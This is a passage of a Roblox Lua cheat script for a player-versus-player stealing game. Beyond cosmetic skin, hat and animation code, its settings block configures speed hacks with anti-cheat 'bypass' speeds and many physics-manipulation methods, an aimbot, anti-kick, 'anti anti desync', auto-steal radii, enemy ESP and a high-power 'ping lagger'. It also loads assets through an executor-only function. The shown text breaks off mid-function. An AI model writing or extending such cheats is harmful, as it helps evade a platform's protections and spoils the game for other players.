        sg.Face = face
        sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
        sg.PixelsPerStud = 90
        sg.Parent = torso
        local f = Instance.new("Frame")
        f.Size = UDim2.new(0.92, 0, 0.4, 0)
        f.Position = UDim2.new(0.04, 0, 0.32, 0)
        f.BackgroundTransparency = 1
        f.Parent = sg
        local t = Instance.new("TextLabel")
        t.Size = UDim2.new(1, 0, 1, 0)
        t.BackgroundTransparency = 1
        t.Text = "XIM"
        t.TextColor3 = (M.getThemeAccent and M.getThemeAccent()) or Color3.fromRGB(255, 255, 255)
        t.Font = Enum.Font.GothamBlack
        t.TextScaled = true
        t.TextStrokeTransparency = 0.2
        t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        t.Parent = f
    end
end

-- Real black Accessory hat with VYNX text
function M.attachVynxHat(char)
    if not char then return end
    local head = char:FindFirstChild("Head")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not head then return end
    for _, c in ipairs(char:GetChildren()) do
        if c.Name == "VynxHat" or c.Name == "VynxHatBrim" or (c:IsA("Accessory") and c:GetAttribute("VynxChip")) then
            pcall(function() c:Destroy() end)
        end
    end

    local acc = Instance.new("Accessory")
    acc.Name = "VynxHat"
    acc:SetAttribute("VynxChip", true)

    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 1)
    handle.Color = Color3.fromRGB(10, 10, 12)
    handle.Material = Enum.Material.SmoothPlastic
    handle.CanCollide = false
    handle.Massless = true
    handle.Transparency = 0
    handle.Parent = acc

    local mesh = Instance.new("SpecialMesh")
    mesh.Name = "Mesh"
    mesh.MeshType = Enum.MeshType.FileMesh
    -- classic black beanie / knit hat mesh
    mesh.MeshId = "rbxassetid://1026228"
    mesh.TextureId = ""
    mesh.Scale = Vector3.new(1.35, 1.35, 1.35)
    mesh.VertexColor = Vector3.new(0.05, 0.05, 0.06)
    mesh.Parent = handle

    local att = Instance.new("Attachment")
    att.Name = "HatAttachment"
    att.Parent = handle

    -- no VYNX text on hat / head (removed)
    acc.Parent = char
    pcall(function()
        if hum then
            hum:AddAccessory(acc)
        end
    end)
    -- weld fallback if accessory attachment fails
    if not handle:FindFirstChildOfClass("Weld") and not handle:FindFirstChildOfClass("WeldConstraint") then
        local w = Instance.new("Weld")
        w.Part0 = head
        w.Part1 = handle
        w.C0 = CFrame.new(0, 0.65, 0.05)
        w.Parent = handle
    end
end

function M.applyVynxBlackSkin(char)
    char = char or player.Character
    if not char then return end
    if not M.vynxBlackSkinEnabled then return end

    M.stripVynxClothing(char)
    M.clearVynxTorsoChip(char)

    local black = Color3.fromRGB(15, 15, 17)
    for _, p in ipairs(char:GetDescendants()) do
        if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart"
            and p.Name ~= "VynxHat" and p.Name ~= "VynxHatBrim" then
            pcall(function()
                p.Color = black
                p.Material = Enum.Material.SmoothPlastic
                if p:IsA("MeshPart") then
                    p.TextureID = ""
                end
            end)
        elseif p:IsA("SpecialMesh") and p.Parent and p.Parent.Name ~= "VynxHat" then
            pcall(function()
                p.TextureId = ""
            end)
        elseif p:IsA("Decal") or p:IsA("Texture") then
            if p.Name == "face" or p.Name == "Face" then
                pcall(function() p:Destroy() end)
            end
        end
    end
    local bc = char:FindFirstChildOfClass("BodyColors")
    if bc then
        pcall(function()
            bc.HeadColor3 = black
            bc.LeftArmColor3 = black
            bc.RightArmColor3 = black
            bc.LeftLegColor3 = black
            bc.RightLegColor3 = black
            bc.TorsoColor3 = black
        end)
    end

    -- Belly VYNX + pants VYNX + real black hat
    M.attachVynxBellyTag(char)
    M.attachVynxPantsTag(char)
    M.attachVynxHat(char)

    if M._vynxBlackChildConn then
        pcall(function() M._vynxBlackChildConn:Disconnect() end)
        M._vynxBlackChildConn = nil
    end
    M._vynxBlackChildConn = char.ChildAdded:Connect(function(c)
        if not M.vynxBlackSkinEnabled then return end
        if c:GetAttribute("VynxChip") then return end
        if c.Name == "VynxHat" or c.Name == "VynxHatBrim" or c:GetAttribute("VynxChip") then return end
        -- keep accessories + hair; only re-strip clothing
        if c:IsA("Shirt") or c:IsA("Pants")
            or c:IsA("ShirtGraphic") or c:IsA("Clothing") then
            task.defer(function() pcall(function() c:Destroy() end) end)
        end
    end)
end

-- XIM SKIN toggle — asset 116358759349760
M.VYNC_SKIN_ID = 116358759349760
M.vyncSkinEnabled = false

local function vyncStrip(char)
    -- keep existing accessories/hair — only used before adding Xim skin piece
    if not char then return end
end

local function vyncFindAcc(obj)
    if not obj then return nil end
    if obj:IsA("Accessory") or obj:IsA("Hat") then return obj end
    local a = obj:FindFirstChildOfClass("Accessory") or obj:FindFirstChildOfClass("Hat")
    if a then return a end
    for _, d in ipairs(obj:GetDescendants()) do
        if d:IsA("Accessory") or d:IsA("Hat") then return d end
    end
    return nil
end

local function vyncLoad(id)
    id = tonumber(id) or 0
    if id <= 0 then return nil end
    local url = "rbxassetid://" .. tostring(id)
    local bag = {}
    pcall(function()
        if typeof(getobjects) == "function" then
            local t = getobjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        elseif game.GetObjects then
            local t = game:GetObjects(url)
            if type(t) == "table" then for _, o in ipairs(t) do table.insert(bag, o) end end
        end
    end)
    pcall(function()
        local m = game:GetService("InsertService"):LoadAsset(id)
        if m then table.insert(bag, m) end
    end)
    pcall(function()
        local IS = game:GetService("InsertService")
        if IS.LoadLocalAsset then
            local o = IS:LoadLocalAsset(url)
            if o then table.insert(bag, o) end
        end
    end)
    for _, o in ipairs(bag) do
        local acc = vyncFindAcc(o)
        if acc then
            local cl = acc:Clone()
            cl:SetAttribute("VynxSkin", true)
            cl.Name = "VynxSkin"
            for _, x in ipairs(bag) do pcall(function() x:Destroy() end) end
            return cl
        end
    end
    for _, x in ipairs(bag) do pcall(function() x:Destroy() end) end
    return nil
end

function M.applyVyncSkin(char)
    if not M.vyncSkinEnabled then return end
    char = char or player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 6)
    if not hum then return end
    vyncStrip(char)
    for _, c in ipairs(char:GetChildren()) do
        if (c:IsA("Accessory") or c:IsA("Hat")) and c:GetAttribute("VynxSkin") then return end
    end
    local id = tonumber(M.VYNC_SKIN_ID) or 116358759349760
    local acc = vyncLoad(id)
    if acc then
        pcall(function() hum:AddAccessory(acc) end)
        if not acc.Parent then acc.Parent = char end
        return
    end
    pcall(function()
        local desc = hum:GetAppliedDescription()
        if not desc then return end
        local idStr = tostring(id)
        for _, slot in ipairs({"HatAccessory","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory"}) do
            pcall(function() desc[slot] = "" end)
        end
        for _, slot in ipairs({"HatAccessory","HairAccessory","BackAccessory","FrontAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","WaistAccessory"}) do
            pcall(function() desc[slot] = idStr end)
        end
        pcall(function() hum:ApplyDescription(desc) end)
        task.wait(0.12)
        local kept = false
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("Accessory") or c:IsA("Hat") then
                if not kept then
                    kept = true
                    c:SetAttribute("VynxSkin", true)
                    c.Name = "VynxSkin"
                else
                    pcall(function() c:Destroy() end)
                end
            end
        end
        if not kept then
            local a2 = vyncLoad(id)
            if a2 then
                pcall(function() hum:AddAccessory(a2) end)
                if not a2.Parent then a2.Parent = char end
            end
        end
    end)
end

function M.clearVyncSkin(char)
    char = char or player.Character
    if not char then return end
    for _, c in ipairs(char:GetChildren()) do
        if (c:IsA("Accessory") or c:IsA("Hat")) and (c:GetAttribute("VynxSkin") or c.Name == "VynxSkin") then
            pcall(function() c:Destroy() end)
        end
    end
end

function M.setVyncSkin(on)
    M.vyncSkinEnabled = on == true
    if M.vyncSkinEnabled then
        M.applyVyncSkin(player.Character)
        task.delay(0.8, function() if M.vyncSkinEnabled then M.applyVyncSkin(player.Character) end end)
    else
        M.clearVyncSkin(player.Character)
    end
    if M.setVyncSkinVisual then pcall(function() M.setVyncSkinVisual(M.vyncSkinEnabled) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.startVyncSkinWatch()
    if M._vyncCharConn then pcall(function() M._vyncCharConn:Disconnect() end); M._vyncCharConn = nil end
    M._vyncCharConn = player.CharacterAdded:Connect(function(char)
        if not M.vyncSkinEnabled then return end
        task.wait(0.45)
        M.applyVyncSkin(char)
        task.delay(1.2, function() if M.vyncSkinEnabled and player.Character == char then M.applyVyncSkin(char) end end)
        task.delay(2.5, function() if M.vyncSkinEnabled and player.Character == char then M.applyVyncSkin(char) end end)
    end)
    if M.vyncSkinEnabled and player.Character then
        task.defer(function() M.applyVyncSkin(player.Character) end)
    end
end

player.CharacterAdded:Connect(function(char)
    task.wait(0.35)
    -- Never force black skin; cosmetics only if toggled on
    M.applyCharterToChar(char)
    -- Persist walk style across reset ONLY if toggle is on; else keep original
    task.delay(0.25, function()
        if player.Character ~= char then return end
        pcall(function() M.applyWalkState(char) end)
    end)
end)

task.spawn(function()
    task.wait(0.2)
    pcall(M.startVyncSkinWatch)
end)

-- ============================================================
-- STATE
-- ============================================================
M.NS = 60
M.CS = 30
M.LAGGER_SPEED = 22
M.LAGGER_CARRY_SPEED = 22
M.BYPASS_SPEED = 40
M.BYPASS_CARRY_SPEED = 22
M.speedMethod = "Velocity"
M.speedMethodList = {
    "Velocity", "AssemblyLinearVelocity", "Velocity Lerp", "AssemblyLinearVelocity Lerp",
    "CFrame", "CFrame Lerp", "Hyper CFrame", "Anchored CFrame", "PivotTo", "Model PivotTo", "Tween CFrame",
    "WalkSpeed", "Humanoid Move", "Humanoid MoveTo",
    "BodyVelocity", "BodyPosition", "BodyForce", "BodyThrust",
    "LinearVelocity", "VectorForce", "AlignPosition",
    "ApplyImpulse", "RocketPropulsion",
}
M.hyperMult = 4
M._lastSpeedMethod = nil
M._speedHRP = nil
M._anchoredBySpeed = nil
M._bodyVel = nil
M._bodyPosition = nil
M._bodyForce = nil
M._bodyThrust = nil
M._linearVel = nil
M._vectorForce = nil
M._alignPos = nil
M._rocket = nil
M._rocketTarget = nil
M._attLinVel = nil
M._attVecForce = nil
M._attAlign = nil
M._speedTween = nil
M.carrySpeedActive = false
M.laggerModeEnabled = false
M.laggerCarryActive = false
M.speedCustomizerEnabled = false
M.speedCustomizerPanel = nil
M.speedUIMode = "Original" -- "Original" | "Customizer"
M.speedBoosterEnabled = true
M.speedBoosterPath = "Normal"
M.speedBoosterPanelOpen = false
M.speedBoosterPos = nil
M.speedBoosterGui = nil
M.speedBoosterMain = nil
M.nukeOptEnabled = false
M._NukeOn = false
M._NukeConns = {}
M._NukeThreads = {}

M.antiRagdollEnabled = false
M.hardHitEnabled = false
M.hardHitRadius = 10
M.antiRagdollMode = "Splatter"
M.infJumpEnabled = false
M.infJumpMode = "manual"
M.medusaCounterEnabled = false
M.batCounterEnabled = false
M.unwalkEnabled = false -- always normal walk, not unwalk
M.medusaResetEnabled = false -- completely removed
M.medusaDebounce = false
M.medusaLastUsed = 0
M.dropActive = false
M.autoLeftEnabled = false
M.autoRightEnabled = false
M.autoBatEnabled = false
M.autoSwingEnabled = true
M.autoMoveSwingEnabled = false
M.autoMoveSwingInterval = 0.3
M._alSwingDebounce = false
M._arSwingDebounce = false
M.antiLagEnabled = true -- Nuke optimizer always ON (no off toggle)
M.antiSummerBaseEnabled = false
M.antiSummerBaseConn = nil
M._antiSummerCleaned = {}

M.removeAccessoriesEnabled = false
M.antiLagDescConn = nil
M.stretchRezEnabled = false
M.stretchRezConn = nil
M.unwalkSavedAnimate = nil
M._anyKeyListening = false
M.autoTPEnabled = false
M.autoTPHeight = 20
M.mirrorTPDownEnabled = false
M.mirrorTPPreviousY = {}
M.mirrorTPLastTeleport = 0
M.MIRROR_TP_DROP_THRESHOLD = 3
M.MIRROR_TP_DOWN_Y = -7.00
M.perfectHitEnabled = true
M.autoTPConn = nil
M.cursedResetRemote = nil
M.CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
M.guiTransparencyEnabled = false
M.mobileButtonsEnabled = true
M.mobileButtonsLocked = false
M.mobileButtonsSize = 60
M.circleButtonsEnabled = false
M.mobBtnRefs = {}
M.mobGuiRef = nil
M.fovValue = 90
M.fovOptions = {70, 80, 90, 100, 120, 150, 180}
M.fovIndex = 3
M.laggerModePillRef = nil
M.carryModePillRef = nil
M.autoSwitchSpeedEnabled = false
M.autoTurnOffSpeedEnabled = false
M.autoSwitchLaggerSpeedEnabled = false
M.autoCarryEnemyBaseEnabled = false
M.autoCarryEnemyBaseRange = 35
M._autoCarryEnemyBaseConn = nil
M.setAutoCarryEnemyBaseVisual = nil
M.AUTO_SWITCH_THRESHOLD = 25
M._autoSwitchSpeedConn = nil
M.customFontSelected = "None"
M._fontOrig = {}
M._fontConn = nil
M._fontMy = nil
M.FONT_NAMES = {"None", "Coding Font", "Summer", "Beachy", "Scary"}
M.mobBtnTransparencyEnabled = false
M.perButtonDragEnabled = true
M.antiKickEnabled = false
M.brainrotDetected = false
M.safeModeEnabled = false
M.activeBatBillboard = nil
M.activeMedusaBillboard = nil
M.ragdollGuiEnabled = true
M.persistentRagdollGui = nil
M.uiLocked = false
M.holdInfJumpConn = nil
M.DROP_ASCEND_DURATION = 0.2
M.DROP_ASCEND_SPEED = 150
M.autoResetOnDeath = false -- completely removed
M.bypassAimbotEnabled = false
M.bypassAimbotConn = nil
M._bypassGodConn = nil
M._bypassGodHealthConn = nil
M._bypassGodDiedConn = nil
M._bypassGodCharConn = nil
M.bypassPrevAutoRotate = nil
M.bypassHitCD = false
M.bypassSwingCD = 0.35
M.bypassHitDist = 8
M._bypassTarget = nil

M.stealMode = "V2"
M.stealBarSize = 300
M.stealBarPos = nil -- {sx, ox, sy, oy} saved auto-grab UI position
M.Steal = {
    AutoStealEnabled = false,
    StealRadius = 61,
    StealDuration = 1.3,
    StopTime = 0.96, -- used for 73% pause (0.96/1.3)
}
M.autoGrabPausePct = 0.73
M.autoGrabSetDelayRadius = 9
M.autoGrabStopEnabled = true
M.autoGrabSetDelayRadius = 9
M.autoGrabStopEnabled = true
M.V3 = {
    enabled = false,
    conn = nil,
    progress = 0,
    lastInRange = 0,
    currentUid = nil,
    holding = false,
    holdPrompt = nil,
    cooldownUntil = 0,
    phase = "fill", -- fill | pause | finish
    pauseAt = 0,
    pauseExtra = 1.0, -- wait +1s after 75% before finish (was 1s early)
}
M.autoRadiusEnabled = false
function M.getAutoRadius()
    local radius = math.clamp((tonumber(M.NS) or 60) + 1, 1, 500)
    return math.floor(radius * 10 + 0.5) / 10
end
function M.getActiveStealRadius()
    if M.stealMode == "Semi" then
        return math.min(tonumber(M.Semi.radius) or 10, 10)
    end
    -- V2 uses main steal radius
    return M.autoRadiusEnabled and M.getAutoRadius() or M.Steal.StealRadius
end
M.Semi = {
    enabled = false,
    holdMin = 1.3,
    holdMax = 2.6,
    entryDelay = 0.3,
    cooldown = 0.05,
    primeRange = 80,
    radius = 10, -- STEAL_RANGE from auto-grabber
    conn = nil,
    scanThread = nil,
    plotSync = {caches = {}, connections = {}},
    animals = {},
    promptCache = {},
    internalCache = {},
    state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
    plots = nil,
    syncReady = false,
}
M.isStealing = false
M.stealStartTime = 0
M.stealConn = nil
M.progressConn = nil
M.animalCache = {}
M.promptCache = {}
M.stealCache = {}
M.playerESPEnabled = true -- circular enemy avatars ON
M.espList = {}
M.pingPopupActive = false
M.pingPopupGui = nil
M.pingCycleTimer = nil
M.pingPanelPos = nil -- {sx, ox, sy, oy}
M.panelBgImageId = 123407376197646 -- default panel background (changeable + saved)

M.pingPanelOpen = false
M.pingLocked = false
M.pingGui = nil
M.pingMain = nil
M.pingSettings = nil
M.pingActive = false
M.pingPower = 100000
M.pingInterval = 0.125
M.pingKeybindKb = "T"
M.pingKeybindGp = "ButtonR2"
M.pingAutoBrainrot = true
M.pingRemote = nil
M.pingBrainrotMode = false
M.pingLastBrainrot = false
M.pingManualOverride = false
M.pingListening = nil
M.pingLoopRunning = false
M.setPingPanelVisual = nil

-- Xim Anti Anti Desync (protect vs enemy TP Bat)
M.aadEnabled = false
M.aadVersion = "V2" -- "V1" | "V2"
M.aadKeybind = "Three"
M.aadPanelOpen = false -- panel removed
M.aadLocked = false
M.aadPanelPos = nil -- {sx, ox, sy, oy}
M.aadGui = nil
M.aadMain = nil
M.aadConn = nil
M.aadKeyConn = nil
M._aadPrevPos = {}
M._aadLastHit = {}
M.setAadPanelVisual = nil
M.setAadToggleVisual = nil

local function _packUDim2(u)
    if typeof(u) ~= "UDim2" then return nil end
    return {sx = u.X.Scale, ox = u.X.Offset, sy = u.Y.Scale, oy = u.Y.Offset}
end
local function _unpackUDim2(t, fallback)
    if type(t) == "table" and type(t.sx) == "number" and type(t.sy) == "number" then
        return UDim2.new(t.sx, tonumber(t.ox) or 0, t.sy, tonumber(t.oy) or 0)
    end
    return fallback
end

M.Conns = {autoSteal=nil, antiRag=nil, batCounter=nil, anchor={}}
M._persistentConns = {}
M.alConn = nil
M.arConn = nil
M.alPhase = 1
M.arPhase = 1
M.aimbotConn = nil
M.lastMoveDir = Vector3.new(0,0,0)
M.batCounterDebounce = false
M.speedLabel = nil

-- Keybinds
M.KB = {
    DropBrainrot={kb=nil,gp=nil},
    AutoLeft={kb=nil,gp=nil},
    AutoRight={kb=nil,gp=nil},
    AutoBat={kb=nil,gp=nil},
    TPFloor={kb=nil,gp=nil},
    InstaReset={kb=nil,gp=nil},
    GuiHide={kb=nil,gp=nil},
    SpeedToggle={kb=nil,gp=nil},
    LaggerToggle={kb=nil,gp=nil},
    BypassAimbot={kb=nil,gp=nil},
    PingLagger={kb=Enum.KeyCode.T,gp=nil},
}
M.AP_L1 = Vector3.new(-476.47,-6.28,92.73)
M.AP_L2 = Vector3.new(-483.12,-4.95,94.81)
M.AP_R1 = Vector3.new(-476.16,-6.52,25.62)
M.AP_R2 = Vector3.new(-483.06,-5.03,25.48)
M.MEDUSA_COOLDOWN = 25
M.BAT_COUNTER_SLAP_LIST = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
M.fovConn = nil
M.defLightBrightness = nil
M.defLightClock = nil
M.defLightAmbient = nil
M.mainFrame = nil
M.normalBox = nil
M.carryBox = nil
M.laggerBox = nil
M.radInput = nil
M.autoTPHeightBox = nil
M.durationBox = nil
M.modeValLbl = nil
M.setInstaGrab = nil
M.setInfJumpVisual = nil
M.setAntiRagVisual = nil
M.setMedusaVisual = nil
M.setUnwalkVisual = nil
M.setAntiLagVisual = nil
M.setAutoSwingVisual = nil
M.setTranspVisual = nil
M.setLockVisual = nil
M.setMobVisual = nil
M.setCircleBtnsVisual = nil
M.setMedusaResetVisual = nil
M.antiKickSetVisual = nil
M.autoLeftSetVisual = nil
M.autoRightSetVisual = nil
M.autoBatSetVisual = nil
M.setAutoTPVisual = nil
M.setStretchRezVisual = nil
M.setAutoResetOnDeath = nil
M.setBypassVisual = nil
M._autoSwitchWasSteal = false

M.MOB_POS_FILE = "moveeduels_btnpos.json"
function M.themeDarkFromAccent(accent, amount)
    amount = math.clamp(tonumber(amount) or 0.12, 0, 1)
    if typeof(accent) ~= "Color3" then accent = Color3.fromRGB(255, 255, 255) end
    return Color3.new(
        math.clamp(accent.R * amount, 0, 1),
        math.clamp(accent.G * amount, 0, 1),
        math.clamp(accent.B * amount, 0, 1)
    )
end
M.MOVE_KEYS = {
    [Enum.KeyCode.W]=true,
    [Enum.KeyCode.A]=true,
    [Enum.KeyCode.S]=true,
    [Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,
    [Enum.KeyCode.Left]=true,
    [Enum.KeyCode.Down]=true,
    [Enum.KeyCode.Right]=true
}

M.showPlayerSpeeds = false
M.playerSpeedGuis = {}
M.playerSpeedUpdateConn = nil
M.removeAccEnabled = false
M.removeAccConn = nil
M.removedAccessories = {}
M.uiScale = 0.48
if UIS.TouchEnabled and not UIS.KeyboardEnabled then
    M.uiScale = 0.48
end
M.uiScaleSliderRef = nil
M.uiScaleLabelRef = nil
M.uiScaleBoxRef = nil
M.lineESPEnabled = false
M.menuOpen = true
M.speedESPEnabled = false

M.statusGui = nil
M.statusFill = nil
M.statusPctLbl = nil
M.statusRadiusLbl = nil
M.statusDot = nil
M.statusMain = nil
M.statusFpsLbl = nil

-- ============================================================
-- UTILITY FUNCTIONS
-- ============================================================
function M.addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(100,100,100)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(100,100,100))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end

function M.applyFOV()
    if M.fovConn then M.fovConn:Disconnect() end
    M.fovConn=RunService.RenderStepped:Connect(function() local cam=workspace.CurrentCamera;if cam then cam.FieldOfView=M.fovValue end end)
end

-- ============================================================
-- RAGDOLL TIMER
-- ============================================================
M.ragdollTimerThread = nil
M.ragdollTimerRemaining = 0
M.isRagdollActive = false

function M.updateRagdollTimer(duration)
    if M.ragdollTimerThread then
        task.cancel(M.ragdollTimerThread)
        M.ragdollTimerThread = nil
    end
    if duration <= 0 then
        M.isRagdollActive = false
        if M.headIndicator and M.headIndicator.ragdollTimer then
            M.headIndicator.ragdollTimer.Text = ""
        end
        return
    end
    M.isRagdollActive = true
    local startTime = tick()
    M.ragdollTimerRemaining = duration
    M.ragdollTimerThread = task.spawn(function()
        while M.isRagdollActive and M.ragdollTimerRemaining > 0 do
            local elapsed = tick() - startTime
            local remaining = math.max(0, duration - elapsed)
            M.ragdollTimerRemaining = remaining
            if M.headIndicator and M.headIndicator.ragdollTimer then
                M.headIndicator.ragdollTimer.Text = string.format("%.1fs", remaining)
            end
            if remaining <= 0 then
                M.isRagdollActive = false
                if M.headIndicator and M.headIndicator.ragdollTimer then
                    M.headIndicator.ragdollTimer.Text = ""
                end
                break
            end
            task.wait(0.05)
        end
        M.ragdollTimerThread = nil
    end)
end

function M.onHumanoidStateChanged(old,new)
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid");if not hum then return end
    local isRag=(new==Enum.HumanoidStateType.Physics or new==Enum.HumanoidStateType.Ragdoll or new==Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand then
        M.updateRagdollTimer(2.6)
    end
end

function M.onMedusaStateChanged()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.PlatformStand then
        M.updateRagdollTimer(4.5)
    end
end

function M.setupRagdollTriggers()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.StateChanged:Connect(M.onHumanoidStateChanged)
        hum:GetPropertyChangedSignal("PlatformStand"):Connect(M.onMedusaStateChanged)
    end
end

-- ============================================================
-- ANIMATION FUNCTIONS (unchanged)
-- ============================================================
function M.waitForAnimate(char)
    for _ = 1, 40 do
        local a = char:FindFirstChild("Animate")
        if a and a:FindFirstChild("idle") and a:FindFirstChild("run") and a:FindFirstChild("walk") then
            return a
        end
        task.wait(0.1)
    end
    return nil
end

function M.setAnim(animObj, id)
    if animObj and id then
        animObj.AnimationId = "rbxassetid://" .. tostring(id)
    end
end

function M.stopAllTracks(hum)
    if not hum then return end
    for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() t:Stop(0) end)
    end
end

function M.ensureAnim(folder, name)
    if not folder then return nil end
    local a = folder:FindFirstChild(name)
    if not a then
        a = Instance.new("Animation")
        a.Name = name
        a.Parent = folder
    end
    return a
end

function M.ensureIdleSlots(idleFolder, n)
    if not idleFolder then return end
    n = n or 2
    for i=1,n do
        M.ensureAnim(idleFolder, "Animation" .. i)
    end
end

function M.pick(pack, ...)
    for i = 1, select("#", ...) do
        local k = select(i, ...)
        local v = pack[k]
        if v ~= nil then return v end
    end
    return nil
end

function M.saveOriginalAnimate(char)
    if not char then return end
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    -- Only capture if we do not already hold a pristine original.
    -- If unwalk/pack are both OFF, force a fresh capture from this character
    -- so reset never restores unwalk anims by mistake.
    if M.savedAnimate and (M.unwalkEnabled or M.animPackEnabled) then
        return
    end
    if M.savedAnimate then
        pcall(function() M.savedAnimate:Destroy() end)
        M.savedAnimate = nil
    end
    M.savedAnimate = animate:Clone()
end

function M.restoreOriginalAnimate(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        M.stopAllTracks(hum)
    end
    local currentAnimate = char:FindFirstChild("Animate")
    if currentAnimate then
        currentAnimate:Destroy()
    end
    if M.savedAnimate then
        local newAnimate = M.savedAnimate:Clone()
        newAnimate.Parent = char
        newAnimate.Disabled = true
        task.wait(0.06)
        newAnimate.Disabled = false
    end
end

function M.resetAnimations(char)
    if not char then return end
    M.restoreOriginalAnimate(char)
end

local applyingAnim = false
function M.applyAnimPack(packName)
    if not M.animPackEnabled then
        local char = player.Character
        if char then
            M.resetAnimations(char)
        end
        return false
    end
    if applyingAnim then return false end
    applyingAnim = true

    local pack = M.PACKS[packName]
    if not pack then
        applyingAnim = false
        return false
    end

    local char = player.Character or player.CharacterAdded:Wait()
    M.saveOriginalAnimate(char)

    local animate = M.waitForAnimate(char)
    if not animate then
        applyingAnim = false
        return false
    end

    local hum = char:FindFirstChildOfClass("Humanoid")
    M.stopAllTracks(hum)

    local runObj   = M.ensureAnim(animate:FindFirstChild("run"),   "RunAnim")
    local walkObj  = M.ensureAnim(animate:FindFirstChild("walk"),  "WalkAnim")
    local jumpObj  = M.ensureAnim(animate:FindFirstChild("jump"),  "JumpAnim")
    local fallObj  = M.ensureAnim(animate:FindFirstChild("fall"),  "FallAnim")
    local climbObj = M.ensureAnim(animate:FindFirstChild("climb"), "ClimbAnim")
    local swimObj  = M.ensureAnim(animate:FindFirstChild("swim"),     "Swim")
    local swimIdleObj = M.ensureAnim(animate:FindFirstChild("swimidle"), "SwimIdle")
    local idleFolder = animate:FindFirstChild("idle")

    M.setAnim(walkObj,  M.pick(pack, "WalkAnim", "Walk"))
    M.setAnim(runObj,   M.pick(pack, "RunAnim", "Run"))
    M.setAnim(jumpObj,  M.pick(pack, "JumpAnim", "Jump"))
    M.setAnim(fallObj,  M.pick(pack, "FallAnim", "Fall"))
    M.setAnim(climbObj, M.pick(pack, "ClimbAnim", "Climb"))
    M.setAnim(swimObj,      M.pick(pack, "Swim"))
    M.setAnim(swimIdleObj,  M.pick(pack, "SwimIdle") or M.pick(pack, "Swim"))

    if idleFolder then
        local a1 = M.pick(pack, "Animation1")
        local a2 = M.pick(pack, "Animation2")
        if a1 or a2 then
            M.ensureIdleSlots(idleFolder, 2)
            local id1 = a1 or a2
            local id2 = a2 or a1 or id1
            M.setAnim(idleFolder:FindFirstChild("Animation1"), id1)
            M.setAnim(idleFolder:FindFirstChild("Animation2"), id2)
        elseif pack.Idle and #pack.Idle > 0 then
            M.ensureIdleSlots(idleFolder, math.max(2, #pack.Idle))
            M.setAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
            M.setAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
            for i = 3, #pack.Idle do
                local a = idleFolder:FindFirstChild("Animation" .. i)
                if a then M.setAnim(a, pack.Idle[i]) end
            end
        end
    end

    animate.Disabled = true
    task.wait(0.06)
    animate.Disabled = false

    if hum then
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Landed)
            task.wait(0.03)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end

    M.animPack = packName
    applyingAnim = false
    return true
end

-- ============================================================
-- PLAYER SPEED DISPLAY
-- ============================================================
function M.createPlayerSpeedGui(plr)
    if plr == player then return end
    if M.playerSpeedGuis[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local old = head:FindFirstChild("MoveePlayerSpeedBB")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveePlayerSpeedBB"
    bb.Size = UDim2.new(0, 80, 0, 24)
    bb.StudsOffset = Vector3.new(0, 2.2, 0)
    bb.AlwaysOnTop = true
    bb.Adornee = head
    bb.Parent = head
    local label = Instance.new("TextLabel", bb)
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = "0"
    label.TextColor3 = CHERRY_ACCENT or Color3.fromRGB(255,255,255)
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextStrokeTransparency = 0
    M.addShimmerToLabel(label, CHERRY_ACCENT or Color3.fromRGB(255,255,255), Color3.fromRGB(255,255,255))
    local conn
    conn = char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            M.removePlayerSpeedGui(plr)
            if conn then conn:Disconnect() end
        end
    end)
    M.playerSpeedGuis[plr] = {gui = bb, label = label, conn = conn}
end

function M.removePlayerSpeedGui(plr)
    local data = M.playerSpeedGuis[plr]
    if data then
        if data.conn then data.conn:Disconnect() end
        if data.gui then data.gui:Destroy() end
        M.playerSpeedGuis[plr] = nil
    end
end

function M.updatePlayerSpeed(plr)
    if not M.showPlayerSpeeds then return end
    local data = M.playerSpeedGuis[plr]
